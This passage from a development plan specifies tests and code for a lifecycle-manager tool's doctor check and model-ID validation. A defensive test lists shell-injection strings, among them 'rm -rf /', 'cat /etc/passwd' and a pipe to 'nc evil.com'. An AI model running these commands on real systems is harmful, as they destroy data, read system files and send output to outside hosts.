- [ ] **Step 4.4.10: Commit** `feat(M4): senex lifecycle status / clear-locks CLI handlers`.

### Task 4.5: Doctor lifecycle check integration

**Files:**
- Modify: `senex/lmstudio_lifecycle.py`
- Modify: `tests/unit/test_lifecycle.py`

- [ ] **Step 4.5.1: Failing test `test_doctor_fail_when_auto_load_and_no_backend`** — `LifecycleBackendFactory.select()` raises; `auto_load=True`; assert `doctor_check_lifecycle_backend(config)` returns `DoctorCheck(name="lmstudio_lifecycle_backend", status="fail", message=...)`.

- [ ] **Step 4.5.2: Failing test `test_doctor_warn_when_no_backend_but_auto_load_false`** — same backend absence; `auto_load=False`; assert `status="warn"` (NOT fail; an attached run with manually-loaded model still works).

- [ ] **Step 4.5.3: Failing test `test_doctor_pass_when_backend_available`** — SDK reachable; assert `status="pass"`, message names which backend was selected.

- [ ] **Step 4.5.4: Implement `doctor_check_lifecycle_backend(config) -> DoctorCheck`** with the three branches above. Import `DoctorCheck` from `senex/phases/preflight.py` (M10) — if the import is unavailable at M4 time, define `DoctorCheck` as a `pydantic.BaseModel` here with `model_config = ConfigDict(extra="forbid")` and let M10 re-export. Add a TODO comment pointing to M10 Task 10.X.

- [ ] **Step 4.5.5: Verify** with literal command:
  ```
  $ pytest tests/unit/test_lifecycle.py -k "doctor" -v
  ============== 3 passed in <X>s ==============
  ```

- [ ] **Step 4.5.6: Commit** `feat(M4): senex doctor lifecycle backend check`.

### Task 4.6: Threat-surface validation (model_id regex on every subprocess + SDK path)

**Files:**
- Modify: `senex/lmstudio_lifecycle.py`
- Modify: `tests/unit/test_lifecycle.py`

- [ ] **Step 4.6.1: Failing test `test_validate_model_id_rejects_shell_metachars`**:
  ```python
  @pytest.mark.parametrize("bad_id", [
      "$(rm -rf /)",
      "model;ls",
      "model && cat /etc/passwd",
      "model`whoami`",
      "model|nc evil.com 9999",
      "../../../etc/passwd",
      "model with space",
      "model\nrm -rf /",
      "model\x00",
      "",
      "x" * 300,            # over reasonable length
  ])
  def test_validate_model_id_rejects(bad_id):
      with pytest.raises(InvalidModelId):
          validate_model_id(bad_id)
  ```

- [ ] **Step 4.6.2: Failing test `test_validate_model_id_accepts_legitimate`**:
  ```python
  @pytest.mark.parametrize("good_id", [
      "google/gemma-4-26b-a4b",
      "lmstudio-community/Qwen2.5-32B-Instruct",
      "model-v1.0",
      "model_with_underscore",
      "model.with.dots",
  ])
  def test_validate_model_id_accepts(good_id):
      assert validate_model_id(good_id) == good_id
  ```

- [ ] **Step 4.6.3: Failing test `test_cli_backend_load_validates_before_subprocess`**:
  ```python
  async def test_cli_backend_load_validates_before_subprocess(monkeypatch):
      mock_proc = AsyncMock()
      monkeypatch.setattr("asyncio.create_subprocess_exec", mock_proc)
      backend = LMSCLIBackend()
      with pytest.raises(InvalidModelId):
          await backend.load("$(rm -rf /)", timeout=120)
      mock_proc.assert_not_called()  # subprocess NEVER invoked
  ```

- [ ] **Step 4.6.4: Failing test `test_cli_backend_unload_validates_before_subprocess`** — same shape for `unload`.

- [ ] **Step 4.6.5: Failing test `test_sdk_backend_load_validates_before_call`** — mock `lmstudio.llm`; assert `InvalidModelId` raised; assert `lmstudio.llm` never called.

- [ ] **Step 4.6.6: Failing test `test_subprocess_uses_list_form_and_shell_false`**:
  ```python
  async def test_subprocess_uses_list_form_and_shell_false(monkeypatch):
      calls = []
      async def fake_exec(*args, **kwargs):
          calls.append((args, kwargs))
          proc = MagicMock(); proc.communicate = AsyncMock(return_value=(b"{}", b"")); proc.returncode = 0
          return proc
      monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
      backend = LMSCLIBackend()
      await backend.load("google/gemma-4-26b-a4b", timeout=120)
      args, kwargs = calls[0]
      assert args[0] == "lms"
      assert args[1] == "load"
      assert args[2] == "google/gemma-4-26b-a4b"
      assert "shell" not in kwargs or kwargs["shell"] is False
      # No string concatenation; argv is a list of separate strings, no shell metachars in any element.
      assert all(isinstance(a, str) and ";" not in a and "&" not in a for a in args)
  ```

- [ ] **Step 4.6.7: Implement `validate_model_id(model_id: str) -> str`**:
  ```python
  _MODEL_ID_RE = re.compile(r"^[A-Za-z0-9_./-]+$")
  _MODEL_ID_MAX_LEN = 256

  def validate_model_id(model_id: str) -> str:
      if not isinstance(model_id, str) or not model_id:
          raise InvalidModelId(f"model_id must be non-empty str, got {type(model_id).__name__!r}")
      if len(model_id) > _MODEL_ID_MAX_LEN:
          raise InvalidModelId(f"model_id length {len(model_id)} exceeds {_MODEL_ID_MAX_LEN}")
      if not _MODEL_ID_RE.match(model_id):
          raise InvalidModelId(f"model_id {model_id!r} does not match {_MODEL_ID_RE.pattern}")
      return model_id
  ```

- [ ] **Step 4.6.8: Wire `validate_model_id` into all backend methods** — `LMStudioSDKBackend.load/unload/is_loaded` AND `LMSCLIBackend.load/unload/is_loaded` AND `Lifecycle.acquire/release/acquire_for_resume`. Validation MUST happen before any external call. Defense in depth (4 layers: Lifecycle entrypoint, backend method, just-before-subprocess argv build, just-before-SDK call).

- [ ] **Step 4.6.9: Verify** with literal command:
  ```
  $ pytest tests/unit/test_lifecycle.py -k "validate or subprocess" -v
  ============== 17 passed in <X>s ==============   (11 reject + 5 accept + 1 list-form)
  ```

- [ ] **Step 4.6.10: Commit** `feat(M4): model_id regex validation across all subprocess + SDK paths (defense in depth)`.

## Edge cases enumerated (all MUST have a test by milestone end)

| # | Edge case | Test name | Owning task |
|---|---|---|---|
| 1 | SDK importable but `list_loaded_models` raises | `test_select_falls_back_when_sdk_unreachable` | 4.1.4 |
| 2 | Both SDK and CLI absent | `test_select_raises_when_neither_available` | 4.1.3 |
| 3 | SDK and CLI return same fingerprint | `test_both_backends_produce_same_fingerprint` (§9 row 34) | 4.1.7 |
| 4 | Concurrent acquire/release across threads | `test_concurrent_acquire_release_no_lost_holder` | 4.0.1 |
| 5 | Corrupt JSON in lockfile | `test_corrupt_json_recovers` | 4.0.2 |
| 6 | POSIX dead PID detection | `test_pid_liveness_posix_branch` | 4.0.3 |
| 7 | Windows dead PID detection | `test_pid_liveness_windows_branch` | 4.0.4 |
| 8 | `auto_load=False` + not loaded | `test_acquire_raises_model_not_loaded_when_auto_load_false` | 4.2.2 |
| 9 | Already-loaded attach path | `test_acquire_attaches_when_already_loaded` | 4.2.3 |
| 10 | All four `ModelUnloadSkipped` reasons | `test_release_skips_unload_*` (4 tests) | 4.2.5–4.2.7 + 4.3.1 |
| 11 | Load timeout | `test_load_timeout_raises_and_does_not_acquire_runlock` | 4.2.8 |
| 12 | Load failure (non-timeout) | `test_load_failure_raises_and_does_not_acquire_runlock` | 4.2.9 |
| 13 | Unload failure post-run | `test_unload_failure_logs_warn_does_not_raise` | 4.2.10 |
| 14 | Resume fingerprint match (§5.5.2.7 row 1) | `test_resume_attached_fingerprint_match` | 4.3.1 |
| 15 | Resume after external unload (§5.5.2.7 row 2) | `test_resume_external_unload_then_reload_still_not_owned` | 4.3.2 |
| 16 | Resume fingerprint mismatch refuse (§5.5.2.7 row 3) | `test_resume_fingerprint_mismatch_refuses` | 4.3.3 |
| 17 | Resume `--allow-mixed-resume` | `test_resume_fingerprint_mismatch_allow_mixed_proceeds` | 4.3.4 |
| 18 | Resume two dead concurrent runs (§5.5.2.7 row 4) | `test_resume_two_concurrent_dead_runs_pruned` | 4.3.5 |
| 19 | Resume cannot set `loaded_by_us=True` | `test_resume_cannot_set_loaded_by_us_true` | 4.3.6 |
| 20 | `senex lifecycle status --json` schema pinned | `test_lifecycle_status_json_schema` | 4.4.1 |
| 21 | `clear-locks` default prunes dead only | `test_clear_locks_default_prunes_dead_only` | 4.4.3 |
| 22 | `clear-locks --force` removes live with warn | `test_clear_locks_force_removes_live_with_warning` | 4.4.4 |
| 23 | `clear-locks` refuses live without force | `test_clear_locks_refuses_live_without_force` | 4.4.5 |
| 24 | Doctor fail when auto_load=true and no backend | `test_doctor_fail_when_auto_load_and_no_backend` | 4.5.1 |
| 25 | Doctor warn when auto_load=false and no backend | `test_doctor_warn_when_no_backend_but_auto_load_false` | 4.5.2 |
| 26 | `model_id` shell-metachar rejection (11 patterns) | `test_validate_model_id_rejects` | 4.6.1 |
| 27 | `model_id` legitimate values (5 patterns) | `test_validate_model_id_accepts` | 4.6.2 |
| 28 | `validate_model_id` raises BEFORE subprocess (CLI load) | `test_cli_backend_load_validates_before_subprocess` | 4.6.3 |
| 29 | `validate_model_id` raises BEFORE subprocess (CLI unload) | `test_cli_backend_unload_validates_before_subprocess` | 4.6.4 |
| 30 | `validate_model_id` raises BEFORE call (SDK load) | `test_sdk_backend_load_validates_before_call` | 4.6.5 |
| 31 | Subprocess argv list-form + `shell=False` | `test_subprocess_uses_list_form_and_shell_false` | 4.6.6 |

## Acceptance criteria (measurable, with literal verification commands)

```
$ pytest tests/unit/test_runlock_concurrency.py tests/unit/test_lifecycle.py tests/unit/test_lifecycle_cli.py -v
========================== 31 passed in <X>s ==========================
```

- All 31 edge cases above have green tests; pytest reports exactly 31 lifecycle/runlock tests passing.
- All 11 `Lifecycle` event types appear at least once across the test suite (verifiable via `grep` over the union of test files; the 11 types are `ModelLoadRequested`, `ModelLoadStarted`, `ModelLoadComplete`, `ModelLoadFailed`, `ModelUnloadStarted`, `ModelUnloadComplete`, `ModelUnloadSkipped`, `ModelUnloadFailed`, `ModelFingerprintChanged`, `RunLockAcquired`, `RunLockReleased`).
- All 4 `ModelUnloadSkipped.reason` enum values are exercised: `concurrent_holders`, `not_loaded_by_us`, `auto_unload_disabled`, `resumed_run_does_not_own_load`.
- All 4 §5.5.2.7 resume table rows have a passing test with the documented outcome.
- All 7 §5.5.2.4 failure-modes table rows have a passing test.
- A test asserts `validate_model_id("$(rm -rf /)")` raises `InvalidModelId` *before* any subprocess invocation (mock + `assert_not_called()`).
- `senex lifecycle status --json` JSON output byte-matches the pinned schema (test 4.4.1).
- `senex lifecycle clear-locks` removes only stale-PID entries by default; `--force` also removes live entries with a stderr warning.
- `senex doctor` returns `status="fail"` when `auto_load=true` and no lifecycle backend is available; `status="warn"` when `auto_load=false`.
- `Lifecycle` events emitted in deterministic order on the happy path: `ModelLoadRequested -> ModelLoadStarted -> ModelLoadComplete -> RunLockAcquired` on acquire; `RunLockReleased -> ModelUnloadStarted -> ModelUnloadComplete` on unload-OK; `RunLockReleased -> ModelUnloadSkipped` on unload-skip.
- A test asserts that `acquire_for_resume()` always sets `loaded_by_us=False` even when the backend just performed a fresh load on the resume path.
- `gitnexus_detect_changes({scope:"all"})` after the milestone shows changes only under `senex/lmstudio_lifecycle.py`, `senex/runlock.py`, `senex/cli.py` (subparser hook), and the four test files listed above.

## Definition of Done

A milestone reviewer can verify M4 is complete by running, in order:

1. `pytest tests/unit/test_runlock_concurrency.py tests/unit/test_lifecycle.py tests/unit/test_lifecycle_cli.py -v` → 31 passed.
2. `pytest tests/unit/test_runlock_concurrency.py tests/unit/test_lifecycle.py tests/unit/test_lifecycle_cli.py --cov=senex.lmstudio_lifecycle --cov=senex.runlock --cov-report=term-missing` → coverage ≥ 85% on both modules (spec §9 coverage target).
3. `python -c "from senex.lmstudio_lifecycle import Lifecycle, LifecycleBackend, LifecycleBackendFactory, ModelInfo, InvalidModelId, FingerprintMismatch, ModelLoadTimeout, ModelLoadFailed, ResumedRunCannotOwnLoad, LifecycleBackendUnavailable, validate_model_id; print('ok')"` → `ok`.
4. `python -c "from senex.runlock import RunLock, RunLockCorrupt; RunLock.acquire('test', 'r1', 1, True); RunLock.release('test', 'r1')"` → no error, no leftover lockfile under `~/.senex/locks/`.
5. `gitnexus_detect_changes({scope:"compare", base_ref:"main"})` shows the expected M4 file scope and risk level ≤ MEDIUM.
